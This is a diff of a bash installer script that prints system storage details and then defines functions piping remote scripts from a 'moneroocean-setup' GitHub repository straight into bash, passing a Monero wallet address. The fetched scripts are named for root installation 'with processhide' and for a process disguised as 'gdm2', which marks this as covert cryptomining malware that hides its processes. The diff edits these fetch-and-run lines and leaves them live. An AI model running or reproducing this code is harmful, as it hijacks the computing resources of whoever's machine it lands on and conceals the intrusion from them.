@@ -32,9 +32,6 @@ for service in "${services[@]}"; do
     fi
 done
 
-apt install wget curl -y
-yum install wget curl -y
-
 # If script reaches here, no specified services are running
 echo "No specified services are running. Continuing with the script..."
 
@@ -45,12 +42,12 @@ echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
 echo -e "---------------------------------"
 
 rootstuff() {
-  curl -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
   [ "$USER" != root ] && sudo -u "$USER" "$0"
 }
 
 userstuff() {
-  curl -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
+  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
 }
 
 if [[ $(id -u) -eq 0 ]]; then
